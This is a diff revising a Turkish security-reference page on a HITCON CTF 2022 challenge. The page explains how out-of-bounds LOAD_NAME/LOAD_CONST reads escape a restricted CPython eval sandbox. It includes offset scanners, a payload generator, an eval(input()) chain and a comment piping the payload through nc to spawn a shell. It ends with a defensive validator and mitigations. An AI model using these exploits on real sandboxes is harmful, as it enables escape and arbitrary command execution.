@@ -1,25 +1,27 @@
 # LOAD_NAME / LOAD_CONST opcode OOB Read
 
-Bu sayfa, Splitline'ın HITCON CTF 2022 "V O I D" için hazırladığı özgün writeup'ını ve exploit chain'ini uyarlar.<sup>[[1]](#references)</sup>
+{{#include ../../../banners/hacktricks-training.md}}
+
+Bu sayfa, Splitline'ın HITCON CTF 2022 "V O I D" için hazırladığı özgün writeup'ı ve exploit chain'i temel alır.<sup>[[1]](#references)</sup>
 
 ### TL;DR <a href="#tldr-2" id="tldr-2"></a>
 
-Bir `LOAD_NAME` veya `LOAD_CONST` operand'ı, kasıtlı olarak kısaltılmış bir `co_names` veya `co_consts` tuple'ının dışını okuyabilir. Bu challenge'da, yakındaki bir giriş `__getattribute__` gibi kullanışlı bir attribute içerene kadar erişilemeyen sahte adlar kullanılır.<sup>[[1]](#references)</sup>
+Bir `LOAD_NAME` veya `LOAD_CONST` operand'ı, kasıtlı olarak kısaltılmış bir `co_names` ya da `co_consts` tuple'ının dışını okuyabilir. Bu challenge'da, yakındaki bir entry `__getattribute__` gibi kullanışlı bir attribute içerene kadar erişilemeyen dummy name'ler kullanılır.<sup>[[1]](#references)</sup>
 
-Kalan payload, bir sandbox escape oluşturmak için elde edilen adı yeniden kullanır.<sup>[[1]](#references)</sup>
+Payload'ın geri kalanı, sandbox escape oluşturmak için elde edilen bu name'i yeniden kullanır.<sup>[[1]](#references)</sup>
 
 ### Genel Bakış <a href="#overview-1" id="overview-1"></a>
 
-Challenge wrapper'ı kısadır ve değerlendirmeden önce tek bir expression derler:<sup>[[1]](#references)</sup>
+Challenge wrapper kısadır ve değerlendirmeden önce tek bir expression derler:<sup>[[1]](#references)</sup>
 ```python
 source = input('>>> ')
 if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))
 ```
-Girdi bir Python code object olarak derlenir, ardından wrapper `eval` çağrılmadan önce `co_consts` ve `co_names` değerlerini boş tuple'larla değiştirir.<sup>[[1]](#references)[[5]](#references)</sup>
+Girdi bir Python code object olarak derlenir, ardından wrapper, `eval` çağrılmadan önce `co_consts` ve `co_names` değerlerini boş tuple'larla değiştirir.<sup>[[1]](#references)[[5]](#references)</sup>
 
-Bu tablolardan birini hâlâ indeksleyen herhangi bir oluşturulmuş instruction, build'e bağlı olarak interpreter'ın crash olmasına veya bitişik bir object pointer'ın açığa çıkmasına neden olabilir.<sup>[[1]](#references)</sup>
+Bu tablolardan birini hâlâ indeksleyen herhangi bir oluşturulmuş instruction, build'e bağlı olarak interpreter'ın çökmesine veya bitişik bir object pointer'ın açığa çıkmasına neden olabilir.<sup>[[1]](#references)</sup>
 
 ### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>
 
@@ -33,11 +35,11 @@ segfault nasıl gerçekleşir?
 6 BUILD_LIST               3
 8 RETURN_VALUE
 ```
-`co_names` `()` ile değiştirilirse bytecode hâlâ `LOAD_NAME 2` taşır; bu nedenle kontrol edilmeyen bir tuple erişimi `IndexError` oluşturmak yerine tuple'ın dışındaki bir pointer'ı alabilir.<sup>[[1]](#references)[[3]](#references)</sup>
+`co_names`, `()`` ile değiştirilirse bytecode hâlâ `LOAD_NAME 2` içerir; bu nedenle denetlenmeyen tuple erişimi `IndexError` oluşturmak yerine tuple dışındaki bir pointer'ı alabilir.<sup>[[1]](#references)[[3]](#references)</sup>
 
-`LOAD_NAME` ve `LOAD_CONST` burada temel primitive'lerdir: integer operand'ları sırasıyla `co_names` ve `co_consts` içindeki girdileri seçer.<sup>[[1]](#references)[[2]](#references)</sup>
+`LOAD_NAME` ve `LOAD_CONST` buradaki temel primitive'lerdir: integer operand'ları sırasıyla `co_names` ve `co_consts` içindeki girdileri seçer.<sup>[[1]](#references)[[2]](#references)</sup>
 
-CPython'ın dispatch işleminde `LOAD_CONST`, seçilen tuple girdisini alıp stack'e push eder; release build'leri kontrol edilmeyen bir tuple accessor kullanır:<sup>[[3]](#references)</sup>
+CPython'ın dispatch mekanizmasında `LOAD_CONST`, seçilen tuple girdisini alıp stack'e push eder; release build'ler denetlenmeyen bir tuple accessor kullanır:<sup>[[3]](#references)</sup>
 ```c
 case TARGET(LOAD_CONST): {
 PREDICTED(LOAD_CONST);
@@ -47,22 +49,22 @@ PUSH(value);
 FAST_DISPATCH();
 }
 ```
-Hedef interpreter üzerinde artan `LOAD_NAME` operand'larını yoklayarak kullanışlı girdileri eşleyin. Splitline, challenge ortamında 700'ün üzerindeki kullanışlı offset'ler gözlemledi; ancak yerleşim build'e özgüdür. Bir debugger, çevredeki belleği incelemeye yardımcı olabilir.<sup>[[1]](#references)</sup>
+Hedef interpreter üzerinde artan `LOAD_NAME` operandlarını deneyerek kullanışlı girdileri eşleyin. Splitline, challenge ortamında 700'ün üzerindeki kullanışlı offset'ler gözlemledi; ancak yerleşim build'e özeldir; bir debugger çevredeki belleği incelemeye yardımcı olabilir.<sup>[[1]](#references)</sup>
 
 ### Exploit'i Oluşturma <a href="#generating-the-exploit" id="generating-the-exploit"></a>
 
-Bir offset kullanışlı bir name verdiğinde, out-of-range lookup'ı erişilemez bir expression içine yerleştirin ve aynı `co_names` slot'una erişilebilir bir attribute access üzerinden referans verin.<sup>[[1]](#references)</sup>
+Bir offset kullanışlı bir ad verdiğinde, aralık dışı lookup işlemini erişilemeyen bir ifadeye yerleştirin ve aynı `co_names` slot'una erişilebilir bir attribute erişiminden başvurun.<sup>[[1]](#references)</sup>
 
-Örneğin offset 5 `__getattribute__` veriyorsa, false branch kullanışlı lookup'ı gerçekleştirirken bu name'i slot 5'te tutun:<sup>[[1]](#references)</sup>
+Örneğin, offset 5 `__getattribute__` veriyorsa, false branch kullanışlı lookup işlemini gerçekleştirirken bu adı slot 5'te tutun:<sup>[[1]](#references)</sup>
 ```python
 [a,b,c,d,e,__getattribute__] if [] else [
 [].__getattribute__
 # you can get the __getattribute__ method of list object now!
 ]
 ```
-> Kurtarılan metnin `__getattribute__` olması gerekmez; payload'u taşıyan herhangi bir identifier bu alanı doldurabilir.<sup>[[1]](#references)</sup>
+> Kurtarılan metnin `__getattribute__` olması gerekmez; payload'a hizmet eden herhangi bir identifier bu slot'u doldurabilir.<sup>[[1]](#references)</sup>
 
-Compiler, disassembly'nin gösterdiği üzere, bir adın tekrarlanan kullanımları için `co_names` alanını yeniden kullanır:<sup>[[1]](#references)[[2]](#references)</sup>
+Compiler, tek bir name'in tekrarlanan kullanımları için `co_names` slot'unu yeniden kullanır; disassembly bunu gösterir:<sup>[[1]](#references)[[2]](#references)</sup>
 ```python
 0 BUILD_LIST               0
 2 POP_JUMP_IF_FALSE       20
@@ -79,20 +81,20 @@ Compiler, disassembly'nin gösterdiği üzere, bir adın tekrarlanan kullanımla
 24 BUILD_LIST               1
 26 RETURN_VALUE
 ```
-`LOAD_ATTR` adını ayrıca `co_names` üzerinden çözdüğü için, erişilebilir dal bu slotu yeniden kullanabilir; daha yeni CPython sürümlerindeki packed operand'lar aşağıdaki sürüm notlarında açıklanmıştır.<sup>[[1]](#references)[[2]](#references)</sup>
+Çünkü `LOAD_ATTR` adını da `co_names` üzerinden çözdüğü için, erişilebilir branch bu slotu yeniden kullanabilir; daha yeni CPython sürümlerindeki packed operand'lar aşağıdaki sürüm notlarında açıklanmıştır.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Küçük negatif olmayan tam sayılar, constants olmadan boolean ifadelerinden üretilebilir:<sup>[[1]](#references)</sup>
+Küçük, negatif olmayan tam sayılar sabitler olmadan boolean ifadeler kullanılarak sentezlenebilir:<sup>[[1]](#references)</sup>
 
 - 0: not \[\[]]
 - 1: not \[]
 - 2: (not \[]) + (not \[])
 - ...
 
-### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>
+### Exploit Scripti <a href="#exploit-script-1" id="exploit-script-1"></a>
 
-Orijinal exploit, challenge'ın uzunluk sınırı içinde kalmak için constants yerine names kullandı.<sup>[[1]](#references)</sup>
+Orijinal exploit, challenge'ın uzunluk sınırı içinde kalmak için sabitler yerine name'ler kullandı.<sup>[[1]](#references)</sup>
 
-Bu yardımcı, boş bir `co_names` tuple'ı ile bir code object oluşturarak olası name offset'lerini tarar.<sup>[[1]](#references)</sup>
+Bu yardımcı, boş bir `co_names` tuple'ı ile bir code object oluşturarak aday name offset'lerini tarar.<sup>[[1]](#references)</sup>
 ```python
 from types import CodeType
 from opcode import opmap
@@ -127,7 +129,7 @@ print(f'{n}: {ret}')
 
 # for i in $(seq 0 10000); do python find.py $i ; done
 ```
-Aşağıdaki generator, kurtarılan offset'leri adlarla eşler ve source-level payload'ı üretir.<sup>[[1]](#references)</sup>
+Aşağıdaki generator, kurtarılan ofsetleri adlarla eşleştirir ve source-level payload üretir.<sup>[[1]](#references)</sup>
 ```python
 import sys
 import unicodedata
@@ -204,7 +206,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-Genel hatlarıyla, oluşturulan payload bir fonksiyonun global değişkenlerini elde eder, `builtins`'i geri kazanır ve `eval(input())` çağrısını yapar.<sup>[[1]](#references)</sup>
+Genel hatlarıyla, oluşturulan payload bir function'ın global değerlerini elde eder, `builtins` öğesini geri kazanır ve `eval(input())` çağrısını yapar.<sup>[[1]](#references)</sup>
 ```python
 getattr = (None).__getattribute__('__class__').__getattribute__
 builtins = getattr(
@@ -219,19 +221,19 @@ builtins['eval'](builtins['input']())
 ```
 ---
 
-### Sürüm notları ve etkilenen opcode'lar (Python 3.11–3.13)
+### Sürüm notları ve etkilenen opcod’lar (Python 3.11–3.13)
 
-- CPython 3.11–3.13 üzerinde talimatlar, code object's constant ve name tablolarını indekslemek için hâlâ integer operand'lar kullanır. Tuple'lardan biri referans verilen indeksten kısaysa, unchecked access bitişik bir object pointer'ı okuyabilir ve crash'e neden olabilir veya bu pointer üzerinde işlem yapabilir; kesin davranış interpreter build'ine bağlıdır.<sup>[[2]](#references)[[3]](#references)</sup>
+- CPython 3.11–3.13’te talimatlar, code object’in constant ve name tablolarını indekslemek için hâlâ integer operand’lar kullanır. Tuple’lardan biri referans verilen indeksten daha kısaysa, unchecked access bitişik bir object pointer’ını okuyabilir ve crash’e veya bu pointer üzerinde işlem yapılmasına neden olabilir; kesin davranış interpreter build’ine bağlıdır.<sup>[[2]](#references)[[3]](#references)</sup>
 - `LOAD_CONST consti` ve (3.12+) `RETURN_CONST consti`, `co_consts[consti]` değerini okur.<sup>[[2]](#references)</sup>
 - Doğrudan name-table kullananlar arasında `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` ve (3.12+) `LOAD_FROM_DICT_OR_GLOBALS` bulunur.<sup>[[2]](#references)</sup>
-- `LOAD_GLOBAL namei` ve `LOAD_ATTR namei`, `co_names[namei >> 1]` kullanır; low bit, belgelenen NULL/method davranışını kontrol eder. (3.12+) `LOAD_SUPER_ATTR namei`, `co_names[namei >> 2]` kullanır ve low bit'lerine iki flag yerleştirir.<sup>[[2]](#references)</sup>
-- Python 3.11+, talimatlar arasına gizli `CACHE` girişleri ekleyen adaptive/inline cache'leri kullanıma sundu. Handcrafted bytecode oluşturulurken `co_code` hazırlanırken bu girişler hesaba katılmalıdır.<sup>[[2]](#references)</sup>
+- `LOAD_GLOBAL namei` ve `LOAD_ATTR namei`, `co_names[namei >> 1]` kullanır; low bit, belgelenen NULL/method davranışını kontrol eder. (3.12+) `LOAD_SUPER_ATTR namei`, `co_names[namei >> 2]` kullanır ve low bit’lerine iki flag yerleştirir.<sup>[[2]](#references)</sup>
+- Python 3.11+, talimatlar arasına gizli `CACHE` entry’leri ekleyen adaptive/inline cache’leri kullanıma sundu. Handcrafted bytecode, `co_code` oluşturulurken bu entry’leri hesaba katmalıdır.<sup>[[2]](#references)</sup>
 
-Pratik çıkarım: bytecode yerleşimi ve elde edilen offset'ler release- ve build-specific'tir. Tekniğe güvenmeden önce tekniği ve oluşturulan payload'ları hedef CPython sürümüne karşı test edin.<sup>[[2]](#references)</sup>
+Pratik sonuç: bytecode yerleşimi ve kurtarılan offset’ler release ve build’e özeldir. Tekniğe güvenmeden önce tekniği ve oluşturulan payload’ı hedef CPython sürümüne karşı test edin.<sup>[[2]](#references)</sup>
 
-### Kullanışlı OOB index'leri bulmak için hızlı tarayıcı (3.11+/3.12+ uyumlu)
+### Kullanışlı OOB index’leri bulmak için hızlı scanner (3.11+/3.12+ uyumlu)
 
-İlginç object'leri high-level source yerine doğrudan bytecode'dan araştırmayı tercih ediyorsanız, minimal code object'ler oluşturup index'leri brute-force tarayabilirsiniz. Aşağıdaki helper, hedef interpreter'ın `dis` metadata'sına göre inline cache'leri ekler.<sup>[[2]](#references)</sup>
+İlginç object’leri high-level source’tan değil, doğrudan bytecode üzerinden araştırmayı tercih ediyorsanız minimal code object’leri oluşturabilir ve index’leri brute-force tarayabilirsiniz. Aşağıdaki helper, target interpreter’ın `dis` metadata’sına göre inline cache’leri ekler.<sup>[[2]](#references)</sup>
 ```python
 import dis, types
 
@@ -271,12 +273,12 @@ if obj is not None:
 print(idx, type(obj), repr(obj)[:80])
 ```
 Notlar
-- Bunun yerine names'i probe etmek için `LOAD_CONST`'ı `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` ile değiştirin ve hedef opcode için stack kullanımını ve packed operand'ı ayarlayın.<sup>[[2]](#references)</sup>
-- Gerekirse >255 indekslere ulaşmak için `EXTENDED_ARG` veya `arg` için birden fazla byte kullanın. Bu helper yalnızca düşük operand byte'ını üretir; bu nedenle daha büyük indeksler için raw byte oluşturma veya birden fazla load gerekir.<sup>[[2]](#references)</sup>
+- Bunun yerine isimleri probe etmek için `LOAD_CONST` öğesini `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` ile değiştirin ve hedef opcode için stack kullanımını ve packed operand'ı ayarlayın.<sup>[[2]](#references)</sup>
+- Gerekirse >255 indekslerine ulaşmak için `EXTENDED_ARG` veya birden fazla `arg` byte'ı kullanın. Bu helper yalnızca düşük operand byte'ını üretir; bu nedenle daha büyük indeksler için ham byte oluşturma veya birden fazla load gerekir.<sup>[[2]](#references)</sup>
 
 ### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)
 
-Bir `co_consts` indeksinin builtins module'e çözümlendiğini belirledikten sonra, stack'i manipüle ederek `co_names` olmadan `eval(input())`'i yeniden oluşturabilirsiniz. Official B01lers CTF 2024 `awpcode` materyali aynı OOB-read pattern'ini belgeler.<sup>[[4]](#references)</sup>
+`co_consts` içinde builtins module'üne çözümlenen bir indeks belirledikten sonra, `co_names` kullanmadan stack'i manipüle ederek `eval(input())` ifadesini yeniden oluşturabilirsiniz. Official B01lers CTF 2024 `awpcode` materyali, aynı OOB-read pattern'ini belgelemektedir.<sup>[[4]](#references)</sup>
 ```python
 # Build co_code that:
 # 1) LOAD_CONST <builtins_idx> → push builtins module
@@ -285,13 +287,13 @@ Bir `co_consts` indeksinin builtins module'e çözümlendiğini belirledikten so
 # 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
 # This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
 ```
-Bu yalnızca stack kullanan yaklaşım, bir challenge size `co_code` üzerinde doğrudan kontrol verirken `co_consts=()` ve `co_names=()` değerlerini zorunlu kıldığında kullanışlıdır; source-level tricks ihtiyacını ortadan kaldırır ve bytecode stack operations ile tuple builders kullanarak payload'ları küçük tutabilir.<sup>[[4]](#references)</sup>
+Bu yalnızca-stack yaklaşımı, bir challenge size doğrudan `co_code` üzerinde kontrol verirken `co_consts=()` ve `co_names=()` kullanmaya zorladığında faydalıdır; source-level hilelerden kaçınır ve bytecode stack işlemleri ile tuple builder'ları kullanarak payload'ları küçük tutabilir.<sup>[[4]](#references)</sup>
 
-### Sandboxes için defensive checks ve mitigations
+### Sandboxes için savunma kontrolleri ve mitigations
 
-Güvenilmeyen code'u derleyen veya değerlendiren bir Python sandbox yazıyorsanız, bytecode tarafından kullanılan tuple index'lerinin bounds-check işlemini CPython'ın yapacağına güvenmeyin. Çalıştırmadan önce code objects'ı validate edin.<sup>[[2]](#references)[[3]](#references)</sup>
+Güvenilmeyen kodu derleyen veya değerlendiren bir Python sandbox yazıyorsanız, bytecode tarafından kullanılan tuple index'lerinin bounds-check işlemini CPython'a bırakmayın. Çalıştırmadan önce code object'lerini doğrulayın.<sup>[[2]](#references)[[3]](#references)</sup>
 
-Pratik validator (`co_consts`/`co_names` için OOB access'i reddeder).<sup>[[2]](#references)</sup>
+Pratik validator (`co_consts/co_names` için OOB erişimini reddeder).<sup>[[2]](#references)</sup>
 ```python
 import dis
 
@@ -329,13 +331,13 @@ raise ValueError("Bytecode refers to name index beyond co_names length")
 # validate_code_object(c)
 # eval(c, {'__builtins__': {}})
 ```
-Ek mitigation fikirleri
-- Güvenilmeyen input üzerinde rastgele `CodeType.replace(...)` kullanımına izin vermeyin veya ortaya çıkan code object üzerinde katı yapısal kontroller uygulayın.
-- CPython semantics'e güvenmek yerine, untrusted code'u OS-level sandboxing (seccomp, job objects, containers) ile ayrı bir process içinde çalıştırmayı değerlendirin.
+Ek azaltım fikirleri
+- Güvenilmeyen girdiler üzerinde rastgele `CodeType.replace(...)` kullanımına izin vermeyin veya ortaya çıkan code object üzerinde katı yapısal kontroller uygulayın.
+- Güvenilmeyen code'u CPython semantics'e güvenmek yerine OS-level sandboxing (seccomp, job objects, containers) ile ayrı bir process'te çalıştırmayı değerlendirin.
 
 ## References
 
-- [1] [Splitline'ın HITCON CTF 2022 writeup'ı "V O I D" (bu tekniğin ve high-level exploit chain'in kaynağı)](https://blog.splitline.tw/hitcon-ctf-2022/)
+- [1] [Splitline'ın HITCON CTF 2022 writeup'ı "V O I D" (bu technique'in ve high-level exploit chain'in kaynağı)](https://blog.splitline.tw/hitcon-ctf-2022/)
 - [2] [Python 3.13 `dis` documentation (bytecode indices, packed name operands ve inline caches)](https://docs.python.org/3.13/library/dis.html)
 - [3] [CPython 3.13.5 tuple-access macros (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
 - [4] [B01lers CTF 2024 `awpcode` challenge writeup (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
